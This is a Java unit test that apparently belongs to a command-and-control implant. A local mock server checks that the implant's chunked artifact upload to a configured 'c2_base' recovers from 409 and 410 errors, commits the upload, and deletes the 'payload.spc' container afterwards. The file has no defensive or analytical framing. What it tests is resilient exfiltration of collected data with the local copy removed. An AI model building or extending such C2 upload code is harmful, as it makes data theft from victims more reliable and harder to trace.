package com.spcagentpayloa.jvmxx.crypto;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CopyOnWriteArrayList;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/** A 409 must reposition and continue; a 410 must re-init, never abandon the upload. */
class UploadResumeTest {
	@TempDir
	Path temp;

	private static final int CHUNK = CryptoConfig.CHUNK;

	@Test
	void offsetConflictAndExpiryResumeAndCommit() throws Exception {
		List<Long> offsets = new CopyOnWriteArrayList<>();
		List<String> uploads = new CopyOnWriteArrayList<>();
		boolean[] conflicted = {false};
		boolean[] expired = {false};

		HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
		server.createContext("/api/v1/artifacts", exchange -> {
			read(exchange);
			if (exchange.getRequestMethod().equals("POST") && exchange.getRequestURI().getPath().equals("/api/v1/artifacts")) {
				String id = "u" + (uploads.size() + 1);
				uploads.add(id);
				respond(exchange, 201, "{\"upload_id\":\"" + id + "\"}");
				return;
			}
			respond(exchange, 200, "{\"received\":0,\"state\":\"open\"}");
		});
		server.createContext("/api/v1/artifacts/", exchange -> {
			String path = exchange.getRequestURI().getPath();
			if (path.endsWith("/commit")) {
				read(exchange);
				respond(exchange, 200, "{}");
				return;
			}
			if (!path.endsWith("/chunk")) {
				respond(exchange, 200, "{\"received\":0,\"state\":\"open\"}");
				return;
			}
			read(exchange);
			long offset = Long.parseLong(exchange.getRequestURI().getQuery().replace("offset=", ""));
			offsets.add(offset);
			if (offset == 0 && !conflicted[0]) {
				conflicted[0] = true;
				respond(exchange, 409, "{\"received\":" + CHUNK + "}");
				return;
			}
			if (offset == CHUNK && !expired[0]) {
				expired[0] = true;
				respond(exchange, 410, "{}");
				return;
			}
			respond(exchange, 200, "{\"received\":" + (offset + CHUNK) + "}");
		});
		server.start();
		try {
			Map<String, Object> map = new LinkedHashMap<>();
			map.put("build_id", "00000000-0000-4000-8000-000000000001");
			map.put("build_secret", Base64.getUrlEncoder().withoutPadding().encodeToString(CryptoUtil.random(32)));
			map.put("c2_base", "http://127.0.0.1:" + server.getAddress().getPort() + "/api/v1");
			map.put("artifact_scheme", 2L);
			CryptoConfig config = new CryptoConfig(map);

			Path install = Files.createDirectories(temp.resolve("install"));
			CryptoModule module = new CryptoModule(install, install, config, null);
			var transport = CryptoModule.class.getDeclaredField("transport");
			transport.setAccessible(true);
			CryptoTransport client = (CryptoTransport) transport.get(module);
			client.identity("00000000-0000-4000-8000-000000000002",
				CryptoUtil.b64url(CryptoUtil.random(32)));

			Path file = temp.resolve("payload.spc");
			byte[] data = new byte[2 * CHUNK + 37];
			for (int i = 0; i < data.length; i++) data[i] = (byte) (i * 31);
			Files.write(file, data);
			String sha = java.util.HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256").digest(data));

			Method send = CryptoModule.class.getDeclaredMethod("sendFrom",
				Path.class, String.class, String.class, int.class, String.class, String.class, long.class);
			send.setAccessible(true);
			send.invoke(module, file, "u0", sha, 3, "test", "", 0L);

			assertTrue(conflicted[0], "the 409 path ran");
			assertTrue(expired[0], "the 410 path ran");
			assertFalse(Files.exists(file), "the container is deleted only after commit");
			assertEquals(List.of(0L, (long) CHUNK, 0L, (long) CHUNK, 2L * CHUNK), offsets);
			assertEquals(1, uploads.size(), "the expired upload was re-initialized");
			assertEquals("u1", uploads.get(0));
		} finally {
			server.stop(0);
		}
	}

	private static void read(HttpExchange exchange) throws java.io.IOException {
		exchange.getRequestBody().readAllBytes();
	}

	private static void respond(HttpExchange exchange, int status, String body) throws java.io.IOException {
		byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
		exchange.getResponseHeaders().set("Content-Type", "application/json");
		exchange.sendResponseHeaders(status, bytes.length);
		exchange.getResponseBody().write(bytes);
		exchange.close();
	}
}
